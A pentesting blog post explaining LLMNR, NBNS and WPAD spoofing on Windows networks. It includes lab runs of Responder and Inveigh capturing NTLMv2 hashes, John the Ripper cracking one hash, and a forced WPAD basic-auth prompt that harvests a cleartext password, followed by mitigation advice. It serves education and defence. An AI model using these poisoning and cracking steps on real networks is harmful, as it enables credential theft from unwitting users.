---
title: "MITM in Windows: LLMNR, NBNS, WPAD Spoofing"
date: 2019-09-29T03:54:38+02:00
toc: true
showdate: true
tags:
  - pentesting
  - windows
---

Here is a little post on a group of techniques I have recently discovered and that I found to be interesting, they're worth their own post because they could become very handy in future Windows audits and the more I learn about Windows exploitation the better!

---

## A little bit of theory

Link-Local Multicast Name Resolution (LLMNR) is a protocol used by Windows hosts to interrogate their neighbors through multicast requests in order to obtain the IP address related to a resource name, much like DNS does when we type a URL in our web browser.

This protocol is used in Windows networks as a fallback option to DNS: if a user tries to access a share located at LAB-02/Disk the user's computer will send out a DNS request to the local DNS server to see if the name of the resource, LAB-02, can be linked to any IP. Most of the times the DNS server will return the correct IP address and so the right computer behind the LAB-02 name will be contacted, however, if no DNS entry for LAB-02 is found then the computer will start sending out multicast LLMNR and NBNS requests, in the hope of finding the wanted resource.

NBNS (Net-BIOS Name Resolution) is the resolution service Windows uses last, NBNS requests are fired up right after LLMNR's requests without waiting for a response (LLMNR is the evolution of NBNS, NBNS being more limited for example to IPv4 hosts only), so the full order of name resolution protocols used in Windows by default is this:

1. DNS
+ LLMNR
+ NBNS

Because LLMNR and NBNS requests are multicasted they will be sent out to all the client's neighbors, multicast means data is sent out to a group of different devices, LLMNR requests have a static multicast destination address of 224.0.0.252 for IPv4 and ff02::1:3 for IPv6.

Because of this, neither LLMNR or NBNS relies on a trusted server like DNS does, so if an attacker happens to be listening for traffic on the network after gaining an initial foothold in his target organization and sees LLMNR requests, he can just respond to those by saying "Hey it's me you're looking for! Can you provide me your credentials so I can give you access to the resource?" and thus the sender trusts the response obtained by the attacker, sending over the user's NTLM hash that would normally be used for authentication over Kerberos, but in this case, it's just being captured for offline cracking.

---

## Exploitation: LLMNR & NBNS

To my surprise this is a relatively common attack vector still to this day, it still requires an attacker to be already sitting in the network in some way, either by hooking up their attacking machine during a pentest or, say, taking control of a client machine through phishing, but once obtained access to the network the attacker has the power of gathering a big amount of user hashes that could potentially allow him to spread the attack over the rest of the domain if not beyond.

In case you got permission from your client to hook up a Linux box directly to their network then you can use *responder*, which among many other features also has that of being a good LLMNR spoofer (Responder can also run on Windows but I never tried it there and I heard it's a pain to set up):

```shell-session
[root@fooxy ~]# responder -I wlp3s0b1
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


           NBT-NS, LLMNR & MDNS Responder 2.3.4.0


  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C




[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]


[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]


[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]


[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]


[+] Generic Options:
    Responder NIC              [wlp3s0b1]
    Responder IP               [192.168.1.99]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']






[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name hello
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name wpad
[HTTP] NTLMv2 Client   : 192.168.1.146
[HTTP] NTLMv2 Username : Giulio-PC\Giulio
[HTTP] NTLMv2 Hash     : Giulio::Giulio-PC:6d75b8b6187f43a7:9DEBA2129CD7B137F8710D0602FCBD43:01010000000000009E021764A975D5013B0434428FD00183000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000D1D977DB91DDA40D1E5032F276471C836B5CD970F1A76DF292C143BBFA5A49680A001000000000000000000000000000000000000900220048005400540050002F003100390032002E003100360038002E0031002E00390039000000000000000000
```

Then your trusted hash cracker can try to launch a dictionary attack against the captured NTLMv2 hash like so, and if you're lucky (or if unlike me you have a good customized wordlist) you can get the clear text password:

```shell-session
[root@fooxy ~]# john nntlm_hash /usr/share/wordlists/rockyou.txt --format=netntlmv2
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
password         (Giulio)
1g 0:00:00:00 DONE 2/3 (2019-09-28 20:45) 1.587g/s 11787p/s 11787c/s 11787C/s 123456..222222
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
[root@fooxy ~]# john --show nntlm_hash
Giulio:password:Giulio-PC:558c30d1f39a106d:AD02E8D0188B78A2E8D1EFA9AA86234D:01010000000000006C656567A975D501E5FE0B7EC75EFB5E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000D1D977DB91DDA40D1E5032F276471C836B5CD970F1A76DF292C143BBFA5A49680A001000000000000000000000000000000000000900140048005400540050002F00680065006C006C006F000000000000000000

1 password hash cracked, 0 left
```

John didn't like my version of rockyou.txt so it switched back to its default dictionary instead, but it still worked because I had set a very basic password for my victim account.

If you have taken control of a Windows host in the network you can rely on Inveigh, which supports LLMNR spoofing as well and not only that, even ADIDNS (Active Directory Integrated Domain Name System) attacks which are an alternative developed by the author of Inveigh himself to [leverage DNS instead of LLMNR](https://blog.netspi.com/exploiting-adidns/).
Here is an example of Inveigh launching an LLMNR spoofing attack and intercepting a hash:

```shell-session
PS /root/Inveigh> Invoke-Inveigh -ConsoleOutput Y -IP 192.168.1.99

[*] Inveigh 1.502 started at 2019-09-28T21:33:13
WARNING: [!] Elevated Privilege Mode = Disabled
[+] Primary IP Address = 192.168.1.99
[+] Spoofer IP Address = 192.168.1.99
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Disabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Disabled
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
[+] [2019-09-28T21:34:37] LLMNR request for testHost received from 192.168.1.146 [response sent]
[+] [2019-09-28T21:34:40] LLMNR request for testHost received from 192.168.1.146 [response sent]
[+] [2019-09-28T21:34:45] LLMNR request for wpad received from 192.168.1.146 [response sent]
[+] [2019-09-28T21:34:45] HTTP(80) GET request for /wpad.dat received from 192.168.1.146:49242
[+] [2019-09-28T21:34:45] HTTP(80) host header 192.168.1.99 received from 192.168.1.146:49242
[+] [2019-09-28T21:34:45] HTTP(80) NTLMv2 captured for Giulio-PC\Giulio from 192.168.1.146(WIN-OUU9E92U85U):49226:Giulio::Giulio-PC:1CCFD4B5BC7F01C6:2005C792AF9057E3F7DF66F087B2F671:0101000000000000789EA19DB075D5012AA8E961CF28230000000000000200000800300030000000000000000100000000200000D1D977DB91DDA40D1E5032F276471C836B5CD970F1A76DF292C143
```

You probably noticed that all the hashes we received above in both cases come from HTTP. This depends on the way the user tries to interact with the desired request, for instance in both examples above I tried to contact a non-existing machine with the *net use \\name** command.
A different result can be obtained if the unlucky user was to type the name of the resource either in the Explorer or Run GUI's, like this:

![img](/images/windows-spoofing/0.png)

This is what we get back:

```shell-session
[root@fooxy llmnr]# responder -I wlp3s0b1
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.4.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [wlp3s0b1]
    Responder IP               [192.168.1.99]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name FASTGATE
[*] [NBT-NS] Poisoned answer sent to 192.168.1.146 for name FASTGATE (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name FASTGATE
[*] [NBT-NS] Poisoned answer sent to 192.168.1.146 for name FASTGATE (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name FASTGATE
[*] [NBT-NS] Poisoned answer sent to 192.168.1.146 for name FASTGATE (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name exampleHost
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name exampleHost
[SMB] NTLMv2-SSP Client   : 192.168.1.146
[SMB] NTLMv2-SSP Username : Giulio-PC\MastroLindo
[SMB] NTLMv2-SSP Hash     : MastroLindo::Giulio-PC:a5116a7b851663ba:91834ADF5B7A374A2BA4144560272DBF:0101000000000000C0653150DE09D2019B7AA9AD6995710D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000020000029C83AFD569C713FF3B7EE956864A9823E7C651526F6F7A00DA78C3C984D0BD20A001000000000000000000000000000000000000900200063006900660073002F006500780061006D0070006C00650048006F0073007400000000000000000000000000
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name wpad
[HTTP] NTLMv2 Client   : 192.168.1.146
[HTTP] NTLMv2 Username : Giulio-PC\MastroLindo
[HTTP] NTLMv2 Hash     : MastroLindo::Giulio-PC:1076a4e4c4402630:E973F2988982F6317FD57A410E66EA83:0101000000000000323DDC4EEB76D501247BBEF5E438D2E3000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000000000000020000029C83AFD569C713FF3B7EE956864A9823E7C651526F6F7A00DA78C3C984D0BD20A001000000000000000000000000000000000000900220048005400540050002F003100390032002E003100360038002E0031002E00390039000000000000000000
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name examplehost
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name examplehost
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name wpad
[*] Skipping previously captured hash for Giulio-PC\MastroLindo
[WebDAV] NTLMv2 Client   : 192.168.1.146
[WebDAV] NTLMv2 Username : Giulio-PC\MastroLindo
[WebDAV] NTLMv2 Hash     : MastroLindo::Giulio-PC:7877530eead632bd:D47E23867AD4D834F7550FA3E6DDFA01:0101000000000000B2D3744FEB76D501B417D98FCD3548B6000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000000000000020000029C83AFD569C713FF3B7EE956864A9823E7C651526F6F7A00DA78C3C984D0BD20A001000000000000000000000000000000000000900200048005400540050002F006500780061006D0070006C00650068006F00730074000000000000000000
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name exampleHost
[*] Skipping previously captured hash for Giulio-PC\MastroLindo
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name wpad
[*] Skipping previously captured hash for Giulio-PC\MastroLindo
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name examplehost
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name examplehost
[*] Skipping previously captured hash for Giulio-PC\MastroLindo
[+] Exiting...
```

Credentials from SMB, HTTP, and even WebDAV!

Metasploit has a module for LLMNR spoofing as well (auxiliary/spoof/llmnr/llmnr_response but I prefer using tools like Responder as they are much faster to deploy and have way more settings.

---

## Exploitation: WPAD

You might have noticed that in the output of both Inveigh and Responder requests for a resource called "wpad" were also intercepted and poisoned. What are those? WPAD stands for Web Proxy Auto Discovery and is a protocol used by web browsers to automatically gather PAC (Proxy Auto-Config) files from a DHCP or DNS server, so that users in an office don't have to set the company's proxy manually from the browser or system settings.

If browsers are configured to do so, they will try to contact first the local DHCP server and ask for a file called wpad.dat, otherwise the DNS server will be contacted to ask if there is any host on the network distributing the wpad file, if it exists, the address of that host will be returned and the client can connect to it to obtain the wpad.dat file needed for the proxy configuration.

This protocol can be exploited because once again if DNS fails to resolve a hostname Windows will send out LLMNR requests looking for the WPAD server:

![img](/images/windows-spoofing/1.png)

And an attacker can respond to them saying "here I am! Here's your proxy configuration file". This is exactly what is going on in the above WireShark capture:

|  **No.** |  **Source** |  **Destination** | **Protocol** |                  **Info**                 |
|:-------:|:-----------:|:----------------:|:------------:|:-----------------------------------------:|
|    85   |    Victim   |    DNS Server    |      DNS     |   "Hey! Do you know where wpad.lan is?"   |
|    86   |  DNS Server |      Victim      |      DNS     |             "Nope, sorry man."            |
| 87 & 88 |    Victim   | Multicast (IPv6) |     LLMNR    | "Hey! Is any one of you the wpad server?" |
| 89 & 90 |    Victim   | Multicast (IPv4) |     LLMNR    | "Hey! Is any one of you the wpad server?" |
|    91   |   Attacker  |      Victim      |     LLMNR    |            "I am! Let's talk."            |

In Response there is a setting to force WPAD authentication, this is a very useful social engineering attack that asks the users a username and password when they are thinking they're connecting to the proxy with their credentials, as they would normally do if a proxy is in place in the network:

![img](/images/windows-spoofing/2.png)

But in reality they are sending an attacker their username and cleartext password:

```shell-session

[root@fooxy llmnr]# responder -I wlp3s0b1 -wFb
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.4.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [ON]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [wlp3s0b1]
    Responder IP               [192.168.1.99]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name wpad
[*] [LLMNR]  Poisoned answer sent to 192.168.1.146 for name proxysrv
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
[HTTP] Basic Client   : 192.168.1.146
[HTTP] Basic Username : MahUser
[HTTP] Basic Password : MahPassword
[+] Exiting...
```

The -wFb options do the following:

- w = enable Responder's WPAD server
- F = force authentication for the wpad.dat file
- b = enable HTTP basic authentication to obtain credentials in plain text

If we take a look at Wireshark we can see the whole attack taking place (I filtered out most of the packets to leave out only the really important ones), from DNS to LLMNR like above and then the victim falling for the spoofing attack, asking our malicious HTTP server for the wpad.dat file by providing the user's credentials, which are transmitted through the HTTP Basic Authentication in clear text:

![img](/images/windows-spoofing/3.png)

---

## Mitigating the issues

As said by Kevin Robertson in his article above the easiest way of being safe from this kind of attacks is making sure no downgrade to LLMNR and NBNS takes place, this can be achieved by adding a wildcard "*" DNS entry in the DNS server that points to a black hole such as 0.0.0.0.

This way DNS will be able to solve the resolution and there will be no need of resorting to dangerous LLMNR multicast requests. If an administrator adds the wildcard entry it will also prevent ADIDNS attacks because this kind of attack can only be launched by attempting to create a new record in the DNS by using a non-existing value, so if values like * and _kerberos and other useful services already exist, an attacker controlling a low privileged user won't be able to use ADIDNS spoofing either. Please take a good read at the article above, it describes the attack in great detail and it does it much better than I ever could, I couldn't replicate the attack due to limited resources.

For WPAD spoofing the simplest solution is obviously adding an entry in the DNS for the right server serving the wpad.dat file, or task the DHCP server for the distribution instead. If no proxy server is implemented in the network some browsers will still try to automatically look for one in  the same way we saw above so you should also disable "Autodetect proxy settings" in the various browsers to prevent this behavior altogether.

---

**References:**

1. [Blog.Netspi: Exploiting ADIDNS](https://blog.netspi.com/exploiting-adidns/)
+ [Pentest.Blog: What are LLMNR and WPAD and how to abuse them during pentests](https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/)
+ [Wireshark Wiki: NBNS](https://wiki.wireshark.org/NetBIOS/NBNS)
+ [Wikipedia: LLMNR](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)
+ [GitHub: Responder](https://github.com/SpiderLabs/Responder)
+ [GitHub: Inveigh Wiki](https://github.com/Kevin-Robertson/Inveigh/wiki)

















